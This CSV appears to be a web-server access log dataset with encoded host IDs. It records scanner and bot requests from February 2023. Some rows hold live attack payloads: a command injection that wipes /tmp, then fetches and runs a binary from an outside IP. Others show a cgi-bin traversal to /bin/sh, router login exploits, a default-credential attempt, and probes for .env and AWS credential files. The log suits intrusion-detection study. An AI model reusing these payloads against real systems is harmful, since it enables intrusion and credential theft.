Host,Date,Time,Method,Endpoint,Protocol,Status Code,Content Size,No of Requests
1844273890,12-Feb-23,20:47:19,7,/laravel/.env,HTTP/1.1,3,169,101
1844273890,12-Feb-23,20:47:19,4,/demo/.env,HTTP/1.1,3,169,101
1844273890,12-Feb-23,20:47:20,7,/demo/.env,HTTP/1.1,3,169,101
1844273890,12-Feb-23,20:47:20,4,/web/.env,HTTP/1.1,3,169,101
1844273890,12-Feb-23,20:47:21,7,/web/.env,HTTP/1.1,3,169,101
1844273890,12-Feb-23,20:47:22,4,/phpinfo,HTTP/1.1,3,169,101
1844273890,12-Feb-23,20:47:22,7,/phpinfo,HTTP/1.1,3,169,101
856628057,12-Feb-23,20:57:45,0,"""-""","""-",6,157,48
856628057,12-Feb-23,20:57:45,55,\x86\x11\x0E\x01h:2\xA1\xEE\xF2\xA6\x97\xBE,,6,157,48
856628057,12-Feb-23,20:57:46,4,/.git/config,HTTP/1.1,3,169,48
856628057,12-Feb-23,20:57:46,4,/.git,HTTP/1.1,3,169,48
856628057,12-Feb-23,20:57:46,72,O]$\x1E\x01\x01\x9E\xA9y\x93tS\xAC\xEB\xEFb\xE1,,6,157,48
856628057,12-Feb-23,20:57:47,4,/.git/config,HTTP/1.1,3,169,48
760759160,12-Feb-23,21:13:05,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,12-Feb-23,21:13:05,0,"""-""","""-",6,0,102
3119963234,12-Feb-23,21:28:17,7,/boaform/admin/formLogin,HTTP/1.1,3,169,45
3119963234,12-Feb-23,21:28:17,0,"""-""","""-",6,0,45
3240141471,12-Feb-23,21:30:01,4,/,HTTP/1.1,3,169,80
760759160,12-Feb-23,21:45:31,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,12-Feb-23,21:45:31,0,"""-""","""-",6,0,102
2104886245,12-Feb-23,21:58:52,4,/,HTTP/1.1,3,169,1
2415145644,12-Feb-23,22:11:18,4,/config/getuser?index=0,HTTP/1.1,3,169,62
760759160,12-Feb-23,22:14:51,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,12-Feb-23,22:14:51,0,"""-""","""-",6,0,102
3119963234,12-Feb-23,22:39:59,4,/,HTTP/1.1,3,169,45
760759160,12-Feb-23,22:44:40,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,12-Feb-23,22:44:40,0,"""-""","""-",6,0,102
3515691158,12-Feb-23,23:08:35,7,/boaform/admin/formLogin,HTTP/1.1,3,169,30
3515691158,12-Feb-23,23:08:35,0,"""-""","""-",6,0,30
3117523604,12-Feb-23,23:12:35,7,/boaform/admin/formLogin,HTTP/1.1,3,169,34
3117523604,12-Feb-23,23:12:35,0,"""-""","""-",6,0,34
760759160,12-Feb-23,23:14:21,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,12-Feb-23,23:14:21,0,"""-""","""-",6,0,102
760759160,12-Feb-23,23:45:13,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,12-Feb-23,23:45:13,0,"""-""","""-",6,0,102
3247346277,12-Feb-23,23:55:27,4,/,HTTP/1.1,3,169,9
3515687697,12-Feb-23,23:57:49,4,/,HTTP/1.1,3,169,5
3117523604,13-Feb-23,00:00:07,7,/boaform/admin/formLogin,HTTP/1.1,3,169,34
3117523604,13-Feb-23,00:00:08,0,"""-""","""-",6,0,34
3117523604,13-Feb-23,00:01:42,7,/boaform/admin/formLogin,HTTP/1.1,3,169,34
3117523604,13-Feb-23,00:01:43,0,"""-""","""-",6,0,34
1334431510,13-Feb-23,00:10:43,3,google.com:443,HTTP/1.1,6,157,5
3117523604,13-Feb-23,00:13:47,7,/boaform/admin/formLogin,HTTP/1.1,3,169,34
3117523604,13-Feb-23,00:13:47,0,"""-""","""-",6,0,34
3632304577,13-Feb-23,00:13:59,4,/.git/HEAD,HTTP/1.1,3,169,1
760759160,13-Feb-23,00:15:55,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,13-Feb-23,00:15:55,0,"""-""","""-",6,0,102
2415145644,13-Feb-23,00:17:25,4,/config/getuser?index=0,HTTP/1.1,3,169,62
100625897,13-Feb-23,00:35:13,4,/,HTTP/1.1,3,169,7
3247346277,13-Feb-23,00:45:06,4,/,HTTP/1.1,3,169,9
760759160,13-Feb-23,00:48:04,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,13-Feb-23,00:48:04,0,"""-""","""-",6,0,102
3240141471,13-Feb-23,01:02:03,4,/,HTTP/1.1,3,169,80
2769707991,13-Feb-23,01:02:46,0,"""-""","""-",6,157,10
2769707991,13-Feb-23,01:02:46,60,")f\xF29#\xA6:\x10\xBDG\xAF-=\xB5~\xAC\x812\x11f\xADSH,Z\xF4\xDC\xE9\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0",,6,157,10
2769707991,13-Feb-23,01:02:46,4,/,HTTP/1.1,3,169,10
2769707991,13-Feb-23,01:02:46,4,/client/get_targets,HTTP/1.1,3,169,10
760759160,13-Feb-23,01:16:30,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,13-Feb-23,01:16:30,0,"""-""","""-",6,0,102
760759160,13-Feb-23,01:47:08,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,13-Feb-23,01:47:08,0,"""-""","""-",6,0,102
3515691158,13-Feb-23,01:48:13,7,/boaform/admin/formLogin,HTTP/1.1,3,169,30
3515691158,13-Feb-23,01:48:14,0,"""-""","""-",6,0,30
974268035,13-Feb-23,01:55:04,4,/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws,HTTP/1.1,3,169,1
760759160,13-Feb-23,02:13:51,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,13-Feb-23,02:13:51,0,"""-""","""-",6,0,102
3079201056,13-Feb-23,02:16:31,4,/,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:22:58,4,/assets/img/favicon.png,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:02,4,/robots.txt,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:03,4,/js/jquery.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:04,4,/js/multipage.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:06,4,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:08,4,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:10,4,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:14,4,/assets/vendor/php-email-form/validate.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:15,4,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:16,4,/assets/vendor/counterup/counterup.min.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:16,4,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:18,4,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:22,4,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:24,4,/assets/vendor/aos/aos.js,HTTP/1.1,3,169,198
3079201056,13-Feb-23,02:23:26,4,/assets/js/main.js,HTTP/1.1,3,169,198
1475129406,13-Feb-23,02:33:02,4,/,HTTP/1.1,3,169,2
2415145644,13-Feb-23,02:38:27,4,/config/getuser?index=0,HTTP/1.1,3,169,62
760759160,13-Feb-23,02:43:54,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,13-Feb-23,02:43:54,0,"""-""","""-",6,0,102
2943025155,13-Feb-23,02:59:22,7,/GponForm/diag_Form?images/,HTTP/1.1,3,169,2
2943025155,13-Feb-23,02:59:22,0,"""-""","""-",6,157,2
37321408,13-Feb-23,02:59:27,4,/.env,HTTP/1.1,3,169,1
762594374,13-Feb-23,03:04:18,4,/,HTTP/1.1,3,169,1
760759160,13-Feb-23,03:12:48,7,/boaform/admin/formLogin,HTTP/1.1,3,169,102
760759160,13-Feb-23,03:12:49,0,"""-""","""-",6,0,102
3117523604,13-Feb-23,03:30:46,7,/boaform/admin/formLogin,HTTP/1.1,3,169,34
3117523604,13-Feb-23,03:30:46,0,"""-""","""-",6,0,34
3005985266,18-Feb-23,03:23:25,4,/,HTTP/1.1,3,169,35
600005986,18-Feb-23,03:53:18,4,/,HTTP/1.1,3,169,5
3240141471,18-Feb-23,04:10:46,4,/,HTTP/1.1,3,169,80
402351690,18-Feb-23,04:41:59,4,/,HTTP/1.1,3,169,5
2338552756,18-Feb-23,04:50:11,4,/,HTTP/1.1,3,169,1
764006020,18-Feb-23,05:00:04,7,/boaform/admin/formLogin,HTTP/1.1,3,169,20
764006020,18-Feb-23,05:00:04,0,"""-""","""-",6,0,20
3240141471,18-Feb-23,05:13:54,4,/,HTTP/1.1,3,169,80
2991560443,18-Feb-23,05:20:20,4,/,HTTP/1.1,3,169,19
2991560443,18-Feb-23,05:20:22,4,/,HTTP/1.1,3,169,19
759020769,18-Feb-23,05:57:45,4,/,HTTP/1.1,3,169,3
2415145644,18-Feb-23,06:10:29,4,/config/getuser?index=0,HTTP/1.1,3,169,62
86888258,18-Feb-23,06:23:42,4,/robots.txt,HTTP/1.1,3,169,5
86888258,18-Feb-23,06:23:46,4,/,HTTP/1.1,3,169,5
3118549559,18-Feb-23,06:24:55,7,/cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh,HTTP/1.1,6,157,5
883396665,18-Feb-23,06:26:43,4,/robots.txt,HTTP/1.1,3,169,12
3475901711,18-Feb-23,06:27:06,4,/,HTTP/1.1,3,169,11
3280283664,18-Feb-23,07:10:01,4,/,HTTP/1.1,3,169,14
1551247186,18-Feb-23,07:50:22,4,/,HTTP/1.1,3,169,16
614210692,18-Feb-23,07:52:36,40,"Ng\xE9\x9F\x1C\xF4\x8Fiw\x88#\xC83\xEA\xC3\xF6\x04h[\x17\xA5\xD3\x14\xD8m\xD3\x1B\xAF\x83Q\xD6\x15\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,6,157,9
614210692,18-Feb-23,07:52:36,4,/,HTTP/1.1,3,169,9
614210692,18-Feb-23,07:52:43,0,"""-""","""-",6,157,9
614210692,18-Feb-23,07:52:44,0,"""-""","""-",6,157,9
614210692,18-Feb-23,07:52:46,47,"&\x06\xDD\xBA\xF7\xDD\xBClS\xCA*\xBCb&'\xBC\xC2QG\xF4\xBE\x11$iHR\x01\xEFS}}\x9E\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,6,157,9
614210692,18-Feb-23,07:52:49,46,"\x1E\xB5\xCC\xD9\xE9\xD8\x01-]*\x92\x94\x91\xBD\x04X\x84Jo\xEB\xD1\xD8\xEEllp\xF2)\xE9Y\xA19\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,6,157,9
614210692,18-Feb-23,07:52:50,36,"\x89\xAD\xE9\x0C?\xDB\x9E\xE0h\xA1g\x01\xE4\x0C\x96\xC78p\x0FH\x8D\xB10\xFB\xA9\x89\x86\x80\xD8\xDCU\x7F\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,6,157,9
614210692,18-Feb-23,07:52:51,30,"\xD0\x0F3nL\xBC\x1C=\x047\xA6V\x85M\x22|XmB(\x86\xECVKBRV;\xD9\xDE\x9Df\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,6,157,9
2148437282,18-Feb-23,08:19:01,4,/,HTTP/1.1,3,169,7
3240141471,18-Feb-23,08:49:25,4,/,HTTP/1.1,3,169,80
2328184206,18-Feb-23,09:09:42,7,/boaform/admin/formLogin,HTTP/1.1,3,169,8
2328184206,18-Feb-23,09:09:42,0,"""-""","""-",6,0,8
3265597511,18-Feb-23,09:29:38,10,mstshash=Domain,,6,157,2
3265597511,18-Feb-23,09:29:39,10,mstshash=Domain,,6,157,2
764006020,18-Feb-23,09:32:37,7,/boaform/admin/formLogin,HTTP/1.1,3,169,20
764006020,18-Feb-23,09:32:37,0,"""-""","""-",6,0,20
1438694865,18-Feb-23,09:39:44,4,/,HTTP/1.1,6,157,1
1806361113,18-Feb-23,09:49:49,4,/druid/index.html,HTTP/1.1,3,169,1
614210691,18-Feb-23,09:50:13,4,/,HTTP/1.0,3,169,9
614210691,18-Feb-23,09:50:15,4,/,HTTP/1.1,3,169,9
614210691,18-Feb-23,09:50:19,4,/favicon.ico,HTTP/1.1,3,169,9
614210691,18-Feb-23,09:50:23,4,/robots.txt,HTTP/1.1,3,169,9
614210691,18-Feb-23,09:50:29,4,/.well-known/security.txt,HTTP/1.1,3,169,9
3245341406,18-Feb-23,09:51:49,4,/,HTTP/1.1,3,169,12
3280283664,18-Feb-23,09:52:50,7,/boaform/admin/formLogin,HTTP/1.1,3,169,14
3280283664,18-Feb-23,09:52:50,0,"""-""","""-",6,0,14
736209403,18-Feb-23,09:55:58,4,/,HTTP/1.1,3,169,1
3337296031,18-Feb-23,10:04:09,4,/,HTTP/1.0,3,169,1
1334431510,18-Feb-23,10:05:42,4,http://ip-api.com/json/,HTTP/1.1,3,169,5
1334431510,18-Feb-23,10:05:43,3,ip-api.com:443,HTTP/1.1,6,157,5
3240141471,18-Feb-23,10:10:54,4,/,HTTP/1.1,3,169,80
2415145644,18-Feb-23,10:11:36,4,/config/getuser?index=0,HTTP/1.1,3,169,62
731569935,18-Feb-23,10:33:51,4,/,HTTP/1.1,3,169,1
3111941555,18-Feb-23,11:06:05,4,/,HTTP/1.1,3,169,1
1475129427,18-Feb-23,11:16:59,4,/,HTTP/1.1,3,169,2
3240141471,18-Feb-23,11:46:17,4,/,HTTP/1.1,3,169,80
3237071112,18-Feb-23,12:00:40,4,/,HTTP/1.1,3,169,1
3562523748,18-Feb-23,12:15:25,4,/,HTTP/1.1,3,169,3
2649159999,18-Feb-23,12:15:52,7,/boaform/admin/formLogin,HTTP/1.1,3,169,15
2649159999,18-Feb-23,12:15:52,0,"""-""","""-",6,0,15
1506830226,18-Feb-23,12:45:54,4,http://ip-api.com/json/,HTTP/1.1,3,169,4
1506830226,18-Feb-23,12:45:54,3,ip-api.com:443,HTTP/1.1,6,157,4
3119963234,18-Feb-23,13:00:07,4,/,HTTP/1.1,3,169,45
3399670379,18-Feb-23,13:12:47,4,/,HTTP/1.1,3,169,1
1905165111,18-Feb-23,13:15:57,4,/,HTTP/1.1,3,169,6
1123077410,18-Feb-23,13:39:28,0,"""-""","""-",6,157,6
1551247186,18-Feb-23,13:47:02,4,/,HTTP/1.1,3,169,16
2183886024,18-Feb-23,14:48:38,4,/,HTTP/1.1,3,169,1
1913099698,18-Feb-23,14:53:53,4,/,HTTP/1.1,3,169,2
1913099698,18-Feb-23,14:53:53,4,/manager/html,HTTP/1.1,3,169,2
3240141471,18-Feb-23,15:09:08,4,/,HTTP/1.1,3,169,80
2649159999,18-Feb-23,15:34:11,7,/boaform/admin/formLogin,HTTP/1.1,3,169,15
2649159999,18-Feb-23,15:34:11,0,"""-""","""-",6,0,15
1583758602,18-Feb-23,15:43:10,4,/,HTTP/1.1,3,169,50
3240141471,18-Feb-23,15:48:46,4,/,HTTP/1.1,3,169,80
976801446,18-Feb-23,15:55:49,4,/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws,HTTP/1.1,3,169,1
3702827708,18-Feb-23,15:55:49,4,/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws,HTTP/1.1,3,169,1
3658972773,18-Feb-23,15:56:07,4,/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws,HTTP/1.1,3,169,1
2649159999,18-Feb-23,16:02:42,4,/,HTTP/1.1,3,169,15
3562523748,18-Feb-23,16:25:35,4,/,HTTP/1.1,3,169,3
2649159999,18-Feb-23,16:34:40,7,/boaform/admin/formLogin,HTTP/1.1,3,169,15
2649159999,18-Feb-23,16:34:40,0,"""-""","""-",6,0,15
3562523748,18-Feb-23,16:37:07,4,/,HTTP/1.1,3,169,3
2649159999,18-Feb-23,16:57:48,7,/boaform/admin/formLogin,HTTP/1.1,3,169,15
2649159999,18-Feb-23,16:57:48,0,"""-""","""-",6,0,15
2412169614,18-Feb-23,17:04:32,4,/,HTTP/1.0,3,169,3
2680930327,18-Feb-23,17:06:06,0,"""-""","""-",6,157,1
1592274786,18-Feb-23,17:14:08,10,mstshash=Domain,,6,157,4
1592274786,18-Feb-23,17:14:08,10,mstshash=Domain,,6,157,4
2649159999,18-Feb-23,17:17:10,7,/boaform/admin/formLogin,HTTP/1.1,3,169,15
2649159999,18-Feb-23,17:17:10,0,"""-""","""-",6,0,15
2552268024,18-Feb-23,17:50:15,4,/,HTTP/1.1,3,169,1
2818082111,18-Feb-23,18:18:59,4,/,HTTP/1.1,3,169,7
2818082111,18-Feb-23,18:19:00,8,*,HTTP/2.0,6,157,7
1334430210,18-Feb-23,18:21:33,4,http://ip-api.com/json/,HTTP/1.1,3,169,4
1334430210,18-Feb-23,18:21:34,3,ip-api.com:443,HTTP/1.1,6,157,4
1844273890,18-Feb-23,18:47:49,4,/.env,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:50,68,"#X`T\xEC\xAD\xAE2)\xE9\xE6\x16#\x06\x9A]i\x8Fd\xCD'\x08,\xE3)\xDB\xCA\x10\x22P0\x16\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0",,6,157,101
1844273890,18-Feb-23,18:47:50,7,/.env,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:50,4,/.aws/credentials,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:51,7,/.aws/credentials,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:51,4,/.aws/config,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:52,7,/.aws/config,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:52,4,/aws/credentials,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:52,7,/aws/credentials,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:53,4,/credentials,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:53,7,/credentials,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:54,4,/test.php,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:54,7,/test.php,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:55,4,/laravel/.env,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:55,7,/laravel/.env,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:55,4,/demo/.env,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:56,7,/demo/.env,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:56,4,/web/.env,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:57,7,/web/.env,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:57,4,/phpinfo,HTTP/1.1,3,169,101
1844273890,18-Feb-23,18:47:58,7,/phpinfo,HTTP/1.1,3,169,101
760198651,18-Feb-23,19:08:41,19,"\xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0",,6,157,1
3240141471,18-Feb-23,19:20:12,4,/,HTTP/1.1,3,169,80
2556019923,18-Feb-23,19:32:34,4,/?XDEBUG_SESSION_START=phpstorm,HTTP/1.1,3,169,84
1100814174,18-Feb-23,20:14:04,4,/.env,HTTP/1.1,3,169,2
1100814174,18-Feb-23,20:14:04,7,/,HTTP/1.1,3,169,2
2333928363,18-Feb-23,20:24:16,4,/,HTTP/1.1,3,169,1
3468526175,18-Feb-23,20:43:37,59,S\x0E\xB3E\xCA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0,,6,157,5
3468526175,18-Feb-23,20:43:37,0,"""-""","""-",6,157,5
3468526175,18-Feb-23,20:43:37,4,/,HTTP/1.1,3,169,5
3468526175,18-Feb-23,20:43:38,4,/client/get_targets,HTTP/1.1,3,169,5
3240141471,18-Feb-23,20:49:28,4,/,HTTP/1.1,3,169,80
2649159999,18-Feb-23,20:51:35,7,/boaform/admin/formLogin,HTTP/1.1,3,169,15
2649159999,18-Feb-23,20:51:35,0,"""-""","""-",6,0,15
2556019923,18-Feb-23,21:05:49,4,/actuator/gateway/routes,HTTP/1.1,3,169,84
3240141471,18-Feb-23,21:11:36,4,/,HTTP/1.1,3,169,80
2956622982,18-Feb-23,21:13:33,4,/,HTTP/1.1,6,157,2
3240141471,18-Feb-23,21:23:57,4,/,HTTP/1.1,3,169,80
2649159999,18-Feb-23,22:21:34,7,/boaform/admin/formLogin,HTTP/1.1,3,169,15
2649159999,18-Feb-23,22:21:34,0,"""-""","""-",6,0,15
1583758602,18-Feb-23,22:31:07,4,/assets/img/apple-touch-icon.png,HTTP/1.1,3,169,50
1583758602,18-Feb-23,22:31:08,4,/assets/img/favicon.png,HTTP/1.1,3,169,50
1583758602,18-Feb-23,22:31:09,4,/,HTTP/1.1,3,169,50
1583758602,18-Feb-23,22:43:51,4,/assets/img/apple-touch-icon.png,HTTP/1.1,3,169,50
1583758602,18-Feb-23,22:43:52,4,/assets/img/favicon.png,HTTP/1.1,3,169,50
1583758602,18-Feb-23,22:43:53,4,/,HTTP/1.1,3,169,50
1572380434,18-Feb-23,22:49:55,4,/,HTTP/1.0,3,169,1
3265597513,18-Feb-23,22:51:01,10,mstshash=Domain,,6,157,4
3265597513,18-Feb-23,22:51:01,10,mstshash=Domain,,6,157,4
3240141471,18-Feb-23,23:10:25,4,/,HTTP/1.1,3,169,80
3708486938,19-Feb-23,00:32:14,4,/phpmyadmin/index.php,HTTP/1.1,3,169,8
3708486938,19-Feb-23,00:32:16,4,/pmd/index.php,HTTP/1.1,3,169,8
996378424,19-Feb-23,00:37:32,4,/boaform/admin/formLogin?username=admin&psd=admin,HTTP/1.0,3,169,1
3079201056,19-Feb-23,00:58:26,4,/,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:04:38,4,/assets/img/favicon.png,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:04:41,4,/robots.txt,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:04:48,4,/js/jquery.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:04:52,4,/js/multipage.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:01,4,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:05,4,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:07,4,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:08,4,/assets/vendor/php-email-form/validate.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:11,4,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:15,4,/assets/vendor/counterup/counterup.min.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:16,4,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:18,4,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:19,4,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:20,4,/assets/vendor/aos/aos.js,HTTP/1.1,3,169,198
3079201056,19-Feb-23,01:05:22,4,/assets/js/main.js,HTTP/1.1,3,169,198
3119963234,19-Feb-23,01:15:19,7,/boaform/admin/formLogin,HTTP/1.1,3,169,45
3119963234,19-Feb-23,01:15:19,0,"""-""","""-",6,0,45
1987799382,19-Feb-23,01:16:10,0,"""-""","""-",6,157,29
1987799382,19-Feb-23,01:16:10,37,"]{u\xA6\x93\x06\xBD\xDD\xFDx\xA6>\xB0\x9D\xA0i\xE51q\x81\xF2\xB7\xEF<\x1B\xEC\x9A\xF4\xA7\xEA\xF9Z\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,6,157,29
1987799382,19-Feb-23,01:16:11,4,/,HTTP/1.1,3,169,29
1987799382,19-Feb-23,01:16:11,4,/,HTTP/1.1,3,169,29
623701701,19-Feb-23,01:20:58,7,/boaform/admin/formLogin,HTTP/1.1,3,169,22
623701701,19-Feb-23,01:20:58,0,"""-""","""-",6,0,22
3119963234,19-Feb-23,01:27:55,4,/,HTTP/1.1,3,169,45
623701703,19-Feb-23,01:30:15,7,/boaform/admin/formLogin,HTTP/1.1,3,169,30
623701703,19-Feb-23,01:30:15,0,"""-""","""-",6,0,30
1505318396,19-Feb-23,01:39:43,7,/boaform/admin/formLogin,HTTP/1.1,3,169,6
1505318396,19-Feb-23,01:39:43,0,"""-""","""-",6,0,6
3274030681,19-Feb-23,02:01:45,4,/printer/objects/list,HTTP/1.1,3,169,6
3240141471,19-Feb-23,02:07:45,4,/,HTTP/1.1,3,169,80
2382682738,19-Feb-23,02:16:10,4,/,HTTP/1.1,3,169,1
623701701,19-Feb-23,02:19:29,7,/boaform/admin/formLogin,HTTP/1.1,3,169,22
623701701,19-Feb-23,02:19:29,0,"""-""","""-",6,0,22
2806507821,19-Feb-23,02:23:34,0,"""-""","""-",6,157,5
2806507821,19-Feb-23,02:23:34,0,"""-""","""-",6,157,5
2806507821,19-Feb-23,02:23:34,4,/,HTTP/1.1,3,169,5
2806507821,19-Feb-23,02:23:34,4,/client/get_targets,HTTP/1.1,3,169,5
623701703,19-Feb-23,02:26:44,7,/boaform/admin/formLogin,HTTP/1.1,3,169,30
623701703,19-Feb-23,02:26:44,0,"""-""","""-",6,0,30
1505318396,19-Feb-23,02:30:57,7,/boaform/admin/formLogin,HTTP/1.1,3,169,6
1505318396,19-Feb-23,02:30:57,0,"""-""","""-",6,0,6
623701735,19-Feb-23,02:32:50,7,/boaform/admin/formLogin,HTTP/1.1,3,169,20
623701735,19-Feb-23,02:32:50,0,"""-""","""-",6,0,20
3164952420,19-Feb-23,03:01:20,4,/favicon.ico,HTTP/1.1,3,169,1
2988492124,19-Feb-23,03:04:15,4,/,HTTP/1.1,3,169,1
600005986,19-Feb-23,03:16:33,4,/,HTTP/1.1,3,169,5
1844273588,17-Feb-23,03:56:52,4,/.env,HTTP/1.1,6,650,73
1844273588,17-Feb-23,03:56:53,4,/.env,HTTP/1.1,7,548,73
3029695910,17-Feb-23,04:02:24,4,/c/,HTTP/1.1,7,548,2
1509467641,17-Feb-23,05:30:20,11,mstshash=Administr,,6,150,11
2415145644,17-Feb-23,06:00:10,4,/config/getuser?index=0,HTTP/1.1,6,248,62
883396698,17-Feb-23,06:21:40,4,/,HTTP/1.1,0,5952,19
3337295920,17-Feb-23,06:46:07,4,/,HTTP/1.1,0,5952,2
